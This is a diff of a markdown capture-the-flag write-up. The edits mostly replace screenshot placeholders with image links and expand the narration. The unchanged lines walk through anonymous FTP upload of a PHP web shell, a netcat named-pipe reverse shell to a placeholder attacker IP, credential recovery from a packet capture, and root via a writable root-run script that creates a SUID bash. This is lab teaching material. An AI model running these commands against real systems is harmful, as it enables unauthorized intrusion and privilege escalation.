@@ -16,7 +16,7 @@ nmap -sC -sV <TARGET_IP>
 
 **Figure 1: Nmap scan results**
 
-[INSERT NMAP SCREENSHOT]
+![Nmap Scan](nmap.jpeg)
 
 The scan revealed three interesting services:
 
@@ -40,7 +40,7 @@ ftp <TARGET_IP>
 
 **Figure 2: Anonymous FTP Login**
 
-[INSERT FTP SCREENSHOT]
+![Anonymous FTP Login](ftp_login.jpeg)
 
 Listing the contents of the FTP server revealed several files and a writable FTP directory.
 
@@ -60,7 +60,7 @@ gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/big.txt
 
 **Figure 3: Gobuster Enumeration**
 
-[INSERT GOBUSTER SCREENSHOT]
+![Gobuster Enumeration](gobuster.jpeg)
 
 The scan revealed a hidden directory:
 
@@ -72,7 +72,7 @@ Visiting the directory exposed the same files that were accessible through FTP.
 
 **Figure 4: Exposed /files Directory**
 
-[INSERT FILES DIRECTORY SCREENSHOT]
+![Files Directory](listed_directory_files.jpeg)
 
 This confirmed that files uploaded through FTP could be accessed directly from the web server.
 
@@ -92,9 +92,11 @@ http://<TARGET_IP>/files/ftp/phpbash.php
 
 **Figure 5: Uploaded PHP Web Shell**
 
-[INSERT PHPBASH UPLOAD SCREENSHOT]
+![PHP Upload](phpbash_upload.jpeg)
 
 The page successfully executed commands, confirming remote code execution as the web server user.
+
+![PHP Web Shell](temp_web_shell.jpeg)
 
 ---
 
@@ -108,7 +110,7 @@ A Netcat listener was started on the attack machine:
 nc -lvnp 4242
 ```
 
-A reverse shell payload was then executed through the web shell.
+Since the web shell only provided command execution through the browser, I upgraded my access by executing a reverse shell payload and connecting back to my attacking machine.
 
 ```bash
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <ATTACKER_IP> 4242 >/tmp/f
@@ -116,7 +118,7 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <ATTACKER_IP> 4242 >/tmp/f
 
 **Figure 6: Reverse Shell Established**
 
-[INSERT REVERSE SHELL SCREENSHOT]
+![Reverse Shell](listener.jpeg)
 
 A successful connection was received, providing a shell as the www-data user.
 
@@ -132,7 +134,7 @@ uid=33(www-data)
 
 With shell access established, I began enumerating the system.
 
-During enumeration, an interesting file was discovered in the root directory.
+During enumeration, I found 2 interesting items (a directory and a file) was discovered in the / directory , with www-data as the owner. I first looked into the file.
 
 ```text
 /recipe.txt
@@ -140,7 +142,7 @@ During enumeration, an interesting file was discovered in the root directory.
 
 **Figure 7: Discovery of recipe.txt**
 
-[INSERT RECIPE SCREENSHOT]
+![Recipe File](recipe_first_question.jpeg)
 
 The file contained the answer to the first room question.
 
@@ -162,9 +164,9 @@ suspicious.pcapng
 
 **Figure 8: Discovery of suspicious.pcapng**
 
-[INSERT INCIDENTS SCREENSHOT]
+![Incidents Directory](incident_directory.jpeg)
 
-To retrieve the file, it was moved into the FTP directory where it could be downloaded through the web interface.
+To retrieve the file, it was moved into the var/www/html/files/ftp directory where it could be downloaded through the web interface.
 
 ---
 
@@ -176,7 +178,7 @@ Inspecting the TCP streams revealed credentials being transmitted.
 
 **Figure 9: Credential Discovery in Wireshark**
 
-[INSERT WIRESHARK SCREENSHOT]
+![Recovered Credentials](lennie_password.jpeg)
 
 The capture exposed Lennie's password.
 
@@ -194,13 +196,16 @@ ssh lennie@<TARGET_IP>
 
 **Figure 10: SSH Access as Lennie**
 
-[INSERT SSH SCREENSHOT]
+![SSH Access](gaining_ssh_lennie.jpeg)
 
 After logging in, the user flag was retrieved successfully.
 
 ```bash
 cat user.txt
 ```
+**Figure 11: User Flag Retrieved**  
+
+![User Flag](user_flag.jpeg)
 
 ---
 
@@ -209,6 +214,8 @@ cat user.txt
 ### Investigating Scripts
 
 Inside Lennie's home directory, a scripts folder was identified.
+
+![Planner Script](scripts.jpeg)
 
 A file named:
 
@@ -228,17 +235,19 @@ echo $LIST > /home/lennie/scripts/startup_list.txt
 
 **Figure 11: planner.sh Analysis**
 
-[INSERT PLANNER SCREENSHOT]
-
 The script executed `/etc/print.sh`.
 
-Further inspection showed that `print.sh` was writable by the current user.
+Further inspection showed that `print.sh` was writable by the current user [lennie]. This misconfiguration is commonly referred to as insecure file permissions, where a lower-privileged user can modify files that are later executed by a privileged process.
 
 This represented a privilege escalation opportunity because the script was executed by a root-owned process.
 
 ---
 
 ### Exploiting print.sh
+
+**Figure 12: Writable print.sh File**  
+
+![Privilege Escalation](insecure_file_permissions_vuln.jpeg)
 
 I modified the script to create a SUID-enabled copy of Bash.
 
@@ -252,9 +261,10 @@ After modifying the script, I executed:
 ./planner.sh
 ```
 
-**Figure 12: SUID Bash Creation**
+---
 
-[INSERT ROOTBASH SCREENSHOT]
+
+**Figure 13: Initial Failure**
 
 A new binary appeared in `/tmp`.
 
@@ -262,21 +272,23 @@ A new binary appeared in `/tmp`.
 /tmp/rootbash
 ```
 
----
-
-### Root Access
-
-The first attempt to execute the binary failed to provide root privileges.
-
 ```bash
 ./rootbash
 ```
 
-**Figure 13: Initial Failure**
+The first attempt to execute the binary failed to provide root privileges.
 
-[INSERT FAILED ROOT SCREENSHOT]
+![Failed Root Attempt](without_privilege.jpeg)
 
-After further investigation, I realized that Bash must be executed with the `-p` flag to preserve elevated privileges.
+My first attempt involved executing the SUID bash binary directly. However, this did not provide access to the root flag because Bash dropped its elevated privileges. This behavior is expected in modern versions of Bash as a security measure.
+
+
+**Figure 14: Root Shell**
+
+
+![Root Access](root_flag.jpeg)
+
+I remembered that Bash requires the -p flag to preserve effective privileges when executed as a SUID binary. Executing the binary with this flag successfully provided a root shell and hell yeahh!! We gained root access
 
 ```bash
 ./rootbash -p
@@ -287,10 +299,6 @@ The command successfully spawned a root shell.
 ```text
 uid=0(root)
 ```
-
-**Figure 14: Root Shell**
-
-[INSERT ROOT FLAG SCREENSHOT]
 
 The root flag was then retrieved successfully.
 
@@ -309,6 +317,18 @@ The root flag was then retrieved successfully.
 9. Writable root-executed script identified.
 10. SUID Bash created through script abuse.
 11. Root shell obtained.
+
+## Skills Practiced
+
+- Service Enumeration
+- Anonymous FTP Abuse
+- Directory Enumeration
+- Web Shell Upload
+- Reverse Shell Acquisition
+- Packet Capture Analysis
+- Credential Harvesting
+- Linux Privilege Escalation
+- SUID Abuse
 
 ## Lessons Learned
 
